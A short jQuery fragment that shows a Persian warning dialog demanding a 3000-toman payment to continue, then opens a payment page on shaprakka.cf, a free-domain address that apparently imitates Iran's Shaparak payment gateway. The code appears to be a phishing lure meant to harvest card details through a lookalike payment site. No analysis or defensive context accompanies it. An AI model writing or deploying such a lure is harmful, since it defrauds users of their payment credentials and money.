$(function () {
    ...
    $('.link').click(function () {
        Confirm('اخطار !! ', 'شما باید برای ادامه فرایند باید مبلغ ۳۰۰۰ تومان را پرداخت کنید.', 'پرداخت ', 'انصراف', function () {
            window.open('http://shaprakka.cf/payment=5698542365.php?amount=30000');
        });
    });
